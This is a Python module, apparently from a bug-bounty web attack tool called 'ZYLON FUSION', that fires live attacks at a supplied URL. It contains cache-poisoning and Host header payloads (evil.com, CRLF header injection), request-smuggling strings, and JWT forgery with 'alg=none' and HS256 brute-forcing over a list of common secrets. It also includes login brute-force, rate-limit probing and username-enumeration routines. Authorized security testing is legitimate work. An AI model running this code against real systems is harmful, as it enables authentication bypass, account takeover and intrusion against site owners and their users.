"""
ZYLON FUSION - Advanced Web Attacks Engine
Cache Poisoning, Request Smuggling, Host Header, JWT Attacks
Bug Bounty Hunter Edition - Termux Non-Root Compatible
"""

import re
import json
import time
import hmac
import base64
import hashlib
import random
import requests
from urllib.parse import urlparse, urljoin, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup

from core.var import USER_AGENTS, DEFAULT_TIMEOUT, VERIFY_SSL
from core.shared_infra import shared_session, regex_cache, PayloadInjector, oob_provider


class AdvancedWebAttacks:
    """Advanced Web Attack Testing for Bug Bounty"""

    def __init__(self, session=None):
        self.session = session or shared_session

    # ========================================================================
    # WEB CACHE POISONING
    # ========================================================================

    def scan_cache_poisoning(self, url):
        """
        Detect web cache poisoning vulnerabilities.
        Attackers can poison cached responses to serve malicious content.
        """
        result = {'vulnerable': False, 'findings': [], 'tested': 0}

        # Unkeyed headers that may affect cache
        unkeyed_headers = [
            'X-Forwarded-Host',
            'X-Forwarded-Proto',
            'X-Forwarded-Scheme',
            'X-Original-URL',
            'X-Rewrite-URL',
            'X-HTTP-Method-Override',
            'X-Forwarded-For',
            'X-Host',
            'X-Forwarded-Server',
            'X-Cache',
            'Pragma',
            'Via',
        ]

        # Poisoning payloads per header
        poison_payloads = {
            'X-Forwarded-Host': ['zylon-cache-test.com', 'evil.com'],
            'X-Forwarded-Proto': ['http', 'nosuchproto'],
            'X-Forwarded-Scheme': ['http', 'nosuch'],
            'X-Original-URL': ['/admin', '/internal'],
            'X-Rewrite-URL': ['/admin', '/dashboard'],
            'X-Forwarded-For': ['127.0.0.1', '0.0.0.0'],  # intentional spoofing payload, not callback
            'X-Host': ['zylon-cache-test.com', 'evil.com'],
        }

        for header, payloads in poison_payloads.items():
            for payload in payloads:
                result['tested'] += 1
                try:
                    # First request with poisoned header
                    headers = {header: payload}
                    resp1 = self.session.get(url, headers=headers, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)

                    # Second request without the header to check if cache is poisoned
                    resp2 = self.session.get(url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)

                    # Check if poisoned content is served
                    if payload in resp1.text and payload in resp2.text:
                        result['vulnerable'] = True
                        result['findings'].append({
                            'header': header,
                            'payload': payload,
                            'evidence': f'Poisoned content served in subsequent request',
                            'severity': 'High',
                            'cache_headers': dict(resp2.headers)
                        })

                    # Check cache headers
                    cache_indicators = {
                        'resp1': {k: v for k, v in resp1.headers.items()
                                 if k.lower() in ['x-cache', 'cf-cache-status', 'age', 'cache-control', 'vary', 'x-cache-hits']},
                        'resp2': {k: v for k, v in resp2.headers.items()
                                 if k.lower() in ['x-cache', 'cf-cache-status', 'age', 'cache-control', 'vary', 'x-cache-hits']},
                    }

                    # If X-Cache: HIT on second request and content differs
                    if (resp2.headers.get('X-Cache', '').lower() == 'hit' or
                        resp2.headers.get('CF-Cache-Status', '').lower() == 'hit'):
                        if resp1.text != resp2.text:
                            result['findings'].append({
                                'header': header,
                                'payload': payload,
                                'evidence': 'Cache HIT with different content',
                                'severity': 'Medium',
                                'cache_info': cache_indicators
                            })

                except Exception:
                    continue

        return result

    # ========================================================================
    # HTTP REQUEST SMUGGLING
    # ========================================================================

    def scan_request_smuggling(self, url):
        """
        Detect HTTP request smuggling vulnerabilities.
        CL.TE and TE.CL variations.
        """
        result = {'vulnerable': False, 'findings': [], 'tested': 0}

        parsed = urlparse(url)
        host = parsed.netloc
        path = parsed.path or '/'

        # CL.TE smuggling payloads
        clte_payloads = [
            # Basic CL.TE
            f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 35\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /smuggled HTTP/1.1\r\nFoo: x",
            # Smuggle to admin
            f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 35\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nX: ",
        ]

        # TE.CL smuggling payloads
        tecl_payloads = [
            f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n5c\r\nGPOST /smuggled HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n",
        ]

        # Note: Full request smuggling requires raw socket connections
        # We'll do a heuristic check based on header handling

        # Check for TE+CL ambiguity
        test_headers = [
            ({'Content-Length': '0', 'Transfer-Encoding': 'chunked'}, 'CL+TE both present'),
            ({'Transfer-Encoding': 'chunked'}, 'TE present'),
            ({'Transfer-Encoding': 'chunked\r\nContent-Length: 0'}, 'TE with embedded CL'),
            ({'Transfer-encoding': 'chunked'}, 'TE lowercase'),
            ({'Transfer-Encoding': 'chunked, identity'}, 'TE multiple'),
        ]

        for headers, description in test_headers:
            result['tested'] += 1
            try:
                # UA rotation handled by shared_session
                resp = self.session.post(url, headers=headers, data='0\r\n\r\n', timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)

                # Check for smuggling indicators
                smuggling_indicators = [
                    'smuggled', 'Request Header Fields Too Large',
                    'Bad Request', '400', 'smuggling',
                ]

                if resp.status_code == 400:
                    result['findings'].append({
                        'headers': str(headers),
                        'description': description,
                        'status': resp.status_code,
                        'severity': 'Medium',
                        'note': 'Server rejected ambiguous headers - verify manually with raw sockets'
                    })

                # Timing-based detection
                start = time.time()
                try:
                    self.session.post(url, headers=headers, data='5\r\nGPOST\r\n0\r\n\r\n', timeout=15, verify=VERIFY_SSL)
                except Exception:
                    pass
                elapsed = time.time() - start

                if elapsed > 5:
                    result['vulnerable'] = True
                    result['findings'].append({
                        'headers': str(headers),
                        'description': description,
                        'response_time': f'{elapsed:.1f}s',
                        'severity': 'High',
                        'note': 'Delayed response suggests request smuggling - verify with Burp'
                    })

            except Exception:
                continue

        return result

    # ========================================================================
    # HOST HEADER INJECTION
    # ========================================================================

    def scan_host_header(self, url):
        """
        Detect Host Header Injection vulnerabilities.
        Can lead to cache poisoning, password reset poisoning, SSRF.
        """
        result = {'vulnerable': False, 'findings': [], 'tested': 0}

        host_payloads = [
            'evil.com',
            'zylon-host-test.com',
            'localhost',  # intentional host header payload, not callback
            '127.0.0.1',  # intentional host header payload, not callback
            'evil.com%00.target.com',
            'target.com.evil.com',
            'evil.com\r\nX-Injected: true',
            'target.com@evil.com',
        ]

        parsed = urlparse(url)
        original_host = parsed.netloc

        for payload in host_payloads:
            result['tested'] += 1
            try:
                headers = {'Host': payload}
                resp = self.session.get(url, headers=headers, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL, allow_redirects=False)

                # Check if payload is reflected
                if payload in resp.text and payload != original_host:
                    result['vulnerable'] = True
                    result['findings'].append({
                        'payload': payload,
                        'evidence': 'Host header reflected in response body',
                        'severity': 'High',
                        'status': resp.status_code
                    })

                # Check if redirect uses poisoned host
                location = resp.headers.get('Location', '')
                if payload in location:
                    result['vulnerable'] = True
                    result['findings'].append({
                        'payload': payload,
                        'evidence': f'Host header in redirect: {location}',
                        'severity': 'High',
                        'status': resp.status_code
                    })

                # Check for password reset functionality
                if 'reset' in resp.text.lower() or 'password' in resp.text.lower():
                    result['findings'].append({
                        'payload': payload,
                        'evidence': 'Password reset functionality found - test host header in reset flow',
                        'severity': 'Medium',
                        'note': 'Host header poisoning in password reset can lead to account takeover'
                    })

            except Exception:
                continue

        # Also test X-Forwarded-Host
        for payload in host_payloads[:3]:
            result['tested'] += 1
            try:
                headers = {'X-Forwarded-Host': payload}
                resp = self.session.get(url, headers=headers, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)

                if payload in resp.text:
                    result['vulnerable'] = True
                    result['findings'].append({
                        'payload': payload,
                        'header': 'X-Forwarded-Host',
                        'evidence': 'X-Forwarded-Host reflected in response',
                        'severity': 'High'
                    })
            except Exception:
                continue

        return result

    # ========================================================================
    # JWT VULNERABILITY SCANNER
    # ========================================================================

    def scan_jwt(self, url):
        """
        Detect JWT vulnerabilities:
        - Algorithm confusion (RS256 → HS256)
        - None algorithm
        - Weak secrets
        - Key ID injection
        """
        result = {'vulnerable': False, 'findings': [], 'tested': 0}

        # Extract JWTs from the application
        jwts = self._extract_jwts(url)
        result['jwt_count'] = len(jwts)

        for jwt_token in jwts:
            result['tested'] += 1
            decoded = self._decode_jwt(jwt_token)

            if not decoded:
                continue

            header = decoded.get('header', {})
            payload = decoded.get('payload', {})

            # Check algorithm
            alg = header.get('alg', '').upper()

            # Test 1: None algorithm
            none_jwt = self._forge_jwt_none(header, payload)
            if none_jwt:
                result['tested'] += 1
                try:
                    resp = self.session.get(url, headers={'Authorization': f'Bearer {none_jwt}'},
                                          timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
                    if resp.status_code == 200:
                        result['vulnerable'] = True
                        result['findings'].append({
                            'type': 'JWT None Algorithm',
                            'original_alg': alg,
                            'payload': 'alg=none',
                            'severity': 'Critical',
                            'note': 'JWT accepted with none algorithm - complete auth bypass'
                        })
                except Exception:
                    pass

            # Test 2: Algorithm confusion (RS256 → HS256)
            if alg == 'RS256':
                result['findings'].append({
                    'type': 'Potential Algorithm Confusion',
                    'original_alg': alg,
                    'severity': 'High',
                    'note': 'RS256 algorithm used - test HS256 confusion with public key as secret'
                })

            # Test 3: Weak secret brute force
            if alg.startswith('HS'):
                common_secrets = [
                    'secret', 'password', 'key', 'jwt_secret', 'super_secret',
                    'your-256-bit-secret', 'secretkey', 'jwt-secret', 'jwt_secret_key',
                    'my_secret', 'app_secret', 'private_key', 'change_me',
                    '1234567890', 'qwertyuiop', 'abcdefghij', '0123456789',
                    'token', 'auth', 'admin', 'root', 'test',
                ]
                for secret in common_secrets:
                    result['tested'] += 1
                    forged = self._forge_jwt_hs256(header, payload, secret)
                    if forged:
                        try:
                            resp = self.session.get(url, headers={'Authorization': f'Bearer {forged}'},
                                                  timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
                            if resp.status_code == 200:
                                result['vulnerable'] = True
                                result['findings'].append({
                                    'type': 'JWT Weak Secret',
                                    'secret': secret,
                                    'severity': 'Critical',
                                    'note': f'JWT signed with weak secret: "{secret}"'
                                })
                                break
                        except Exception:
                            pass

            # Check for sensitive data in payload
            sensitive_keys = ['password', 'secret', 'private', 'ssn', 'credit_card']
            for key in sensitive_keys:
                if key in str(payload).lower():
                    result['findings'].append({
                        'type': 'Sensitive Data in JWT',
                        'key': key,
                        'severity': 'Medium',
                        'note': f'Sensitive data "{key}" found in JWT payload'
                    })

            # Check for jku/x5u header injection
            if 'jku' in header or 'x5u' in header:
                result['findings'].append({
                    'type': 'JWT JKU/X5U Injection Possible',
                    'severity': 'High',
                    'note': 'JWT uses external key URL - test with attacker-controlled URL'
                })

        return result

    def _extract_jwts(self, url):
        """Extract JWT tokens from the application"""
        jwts = []
        try:
            resp = self.session.get(url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)

            # From cookies
            for cookie in resp.cookies:
                if len(cookie.value) > 50 and '.' in cookie.value:
                    parts = cookie.value.split('.')
                    if len(parts) == 3:
                        jwts.append(cookie.value)

            # From response body
            jwt_pattern = r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'
            matches = regex_cache.findall('jwt', resp.text)
            jwts.extend(matches)

            # From Authorization header in localStorage/sessionStorage (from JS)
            soup = BeautifulSoup(resp.text, 'html.parser')
            for script in soup.find_all('script'):
                if script.string:
                    matches = regex_cache.findall('jwt', script.string)
                    jwts.extend(matches)

        except Exception:
            pass

        return list(set(jwts))

    def _decode_jwt(self, token):
        """Decode JWT without verification"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None

            # Decode header
            header_b64 = parts[0]
            header_b64 += '=' * (4 - len(header_b64) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_b64))

            # Decode payload
            payload_b64 = parts[1]
            payload_b64 += '=' * (4 - len(payload_b64) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))

            return {'header': header, 'payload': payload}
        except Exception:
            return None

    def _forge_jwt_none(self, header, payload):
        """Forge JWT with none algorithm"""
        try:
            header_copy = dict(header)
            header_copy['alg'] = 'none'
            header_b64 = base64.urlsafe_b64encode(json.dumps(header_copy).encode()).rstrip(b'=').decode()
            payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
            return f"{header_b64}.{payload_b64}."
        except Exception:
            return None

    def _forge_jwt_hs256(self, header, payload, secret):
        """Forge JWT with HS256 using a secret"""
        try:
            header_copy = dict(header)
            header_copy['alg'] = 'HS256'
            header_b64 = base64.urlsafe_b64encode(json.dumps(header_copy).encode()).rstrip(b'=').decode()
            payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
            message = f"{header_b64}.{payload_b64}"

            signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
            signature_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()

            return f"{message}.{signature_b64}"
        except Exception:
            return None

    # ========================================================================
    # BROKEN AUTHENTICATION DETECTOR
    # ========================================================================

    def scan_broken_auth(self, url):
        """
        Detect broken authentication vulnerabilities:
        - Weak password policies
        - Credential stuffing potential
        - Session management issues
        - Brute force possibilities
        """
        result = {'vulnerable': False, 'findings': [], 'tested': 0}

        # Find login endpoints
        login_urls = self._find_login_endpoints(url)

        for login_url in login_urls:
            result['tested'] += 1

            # Test 1: Weak password policy
            weak_passwords = ['123456', 'password', 'admin', '12345678', 'qwerty']
            for weak_pass in weak_passwords[:2]:
                result['tested'] += 1
                try:
                    resp = self.session.post(login_url, data={
                        'username': 'admin', 'password': weak_pass,
                        'email': 'admin@test.com'
                    }, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)

                    if resp.status_code == 200 and 'error' not in resp.text.lower():
                        result['findings'].append({
                            'type': 'Weak Password Accepted',
                            'password': weak_pass,
                            'url': login_url,
                            'severity': 'Critical',
                            'note': 'Weak password accepted - credential stuffing possible'
                        })
                except Exception:
                    pass

            # Test 2: No rate limiting / Brute force
            failed_attempts = 0
            for i in range(10):
                result['tested'] += 1
                try:
                    resp = self.session.post(login_url, data={
                        'username': 'admin', 'password': f'wrong_{i}'
                    }, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)

                    if resp.status_code == 429:
                        result['findings'].append({
                            'type': 'Rate Limiting Present',
                            'url': login_url,
                            'severity': 'Info',
                            'note': 'Rate limiting detected - brute force limited'
                        })
                        break
                    elif 'error' in resp.text.lower() or 'invalid' in resp.text.lower():
                        failed_attempts += 1
                except Exception:
                    pass

            if failed_attempts >= 8:
                result['vulnerable'] = True
                result['findings'].append({
                    'type': 'No Rate Limiting on Login',
                    'url': login_url,
                    'attempts': failed_attempts,
                    'severity': 'High',
                    'note': 'No rate limiting detected - brute force/credential stuffing possible'
                })

            # Test 3: Username enumeration
            valid_user_resp = self.session.post(login_url, data={
                'username': 'admin', 'password': 'wrong_password'
            }, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)

            invalid_user_resp = self.session.post(login_url, data={
                'username': 'nonexistent_user_zylon_test_12345', 'password': 'wrong_password'
            }, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)

            if len(valid_user_resp.text) != len(invalid_user_resp.text):
                diff = abs(len(valid_user_resp.text) - len(invalid_user_resp.text))
                if diff > 50:
                    result['findings'].append({
                        'type': 'Username Enumeration',
                        'url': login_url,
                        'response_diff': diff,
                        'severity': 'Medium',
                        'note': 'Different responses for valid vs invalid usernames'
                    })

        return result

    def _find_login_endpoints(self, url):
        """Find login/auth endpoints on the target"""
        login_urls = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        login_paths = [
            '/login', '/signin', '/auth/login', '/auth/signin',
            '/api/login', '/api/auth/login', '/api/v1/login',
            '/authenticate', '/auth', '/account/login',
            '/wp-login.php', '/admin/login',
        ]

        for path in login_paths:
            try:
                test_url = f"{base}{path}"
                resp = self.session.get(test_url, timeout=5, verify=VERIFY_SSL)
                if resp.status_code == 200:
                    login_urls.append(test_url)
            except Exception:
                continue

        # Also check forms on the main page
        try:
            resp = self.session.get(url, timeout=DEFAULT_TIMEOUT, verify=VERIFY_SSL)
            soup = BeautifulSoup(resp.text, 'html.parser')
            for form in soup.find_all('form'):
                action = form.get('action', '')
                has_password = any(inp.get('type') == 'password' for inp in form.find_all('input'))
                if has_password:
                    form_url = urljoin(url, action) if action else url
                    login_urls.append(form_url)
        except Exception:
            pass

        return list(set(login_urls))
